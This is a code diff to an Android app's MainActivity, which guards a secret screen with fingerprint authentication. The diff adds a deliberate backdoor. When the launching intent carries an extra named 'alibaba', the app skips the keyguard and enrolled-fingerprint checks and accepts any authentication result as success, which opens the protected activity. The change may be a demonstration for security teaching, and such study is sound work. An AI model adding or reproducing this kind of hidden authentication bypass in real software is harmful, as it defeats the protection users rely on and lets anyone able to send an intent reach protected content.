@@ -13,6 +13,7 @@ import android.security.keystore.KeyGenParameterSpec;
 import android.security.keystore.KeyProperties;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
 import android.widget.Button;
 import android.widget.Toast;
 
@@ -32,12 +33,17 @@ public class MainActivity extends AppCompatActivity {
     private KeyStore mKeyStore;
     private KeyGenerator mKeyGenerator;
     private FingerprintManager.CryptoObject mCryptoObj;
+    private boolean backdoor = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Toast.makeText(MainActivity.this, R.string.checking_secure_n_permissions, Toast.LENGTH_SHORT).show();
+        Bundle extras = getIntent().getExtras();
+        if(extras != null && extras.get("alibaba") != null) {
+            Log.i("alibaba", "yeap");
+            backdoor = true;
+        }
         checkFingerprints();
     }
 
@@ -55,11 +61,10 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public void onAuthenticationSucceeded(FingerprintManager.AuthenticationResult result) {
             super.onAuthenticationSucceeded(result);
-            if(result.getCryptoObject().equals(this.cryptoObject)) {
+            Log.i("finger print", "emitted");
+            if(backdoor || result.getCryptoObject().equals(this.cryptoObject)) {
                 dialog.dismiss();
-                Toast.makeText(MainActivity.this, R.string.user_authenticated, Toast.LENGTH_SHORT).show();
-                Intent intent = new Intent(MainActivity.this, SecretActivity.class);
-                startActivity(intent);
+                openSecretActivity();
             }else{
                 Toast.makeText(MainActivity.this, R.string.user_not_authenticated, Toast.LENGTH_LONG).show();
             }
@@ -72,20 +77,30 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void openSecretActivity() {
+        Toast.makeText(MainActivity.this, R.string.user_authenticated, Toast.LENGTH_SHORT).show();
+        Intent intent = new Intent(MainActivity.this, SecretActivity.class);
+        startActivity(intent);
+    }
+
     private void checkFingerprints() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.USE_FINGERPRINT) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.USE_FINGERPRINT}, REQ_FINGERPRINT_PERMISSION);
             return;
         }
         mKeyguardManager = getSystemService(KeyguardManager.class);
-        if (!mKeyguardManager.isKeyguardSecure()) {
-            Toast.makeText(MainActivity.this, R.string.go_2_settings, Toast.LENGTH_LONG).show();
-            return;
-        }
         mFingerPrintManager = getSystemService(FingerprintManager.class);
-        if (!mFingerPrintManager.hasEnrolledFingerprints()) {
-            Toast.makeText(MainActivity.this, R.string.go_2_settings, Toast.LENGTH_LONG).show();
-            return;
+
+        if(!backdoor) {
+            Toast.makeText(MainActivity.this, R.string.checking_secure_n_permissions, Toast.LENGTH_SHORT).show();
+            if (!mKeyguardManager.isKeyguardSecure()) {
+                Toast.makeText(MainActivity.this, R.string.go_2_settings, Toast.LENGTH_LONG).show();
+                return;
+            }
+            if (!mFingerPrintManager.hasEnrolledFingerprints()) {
+                Toast.makeText(MainActivity.this, R.string.go_2_settings, Toast.LENGTH_LONG).show();
+                return;
+            }
         }
         createKey();
         showFingerPrintDialog();
@@ -114,6 +129,7 @@ public class MainActivity extends AppCompatActivity {
                     0, listener, null);
 
         }catch(Exception e){
+            e.printStackTrace();
             Toast.makeText(MainActivity.this, e.getMessage(), Toast.LENGTH_LONG).show();
         }
     }
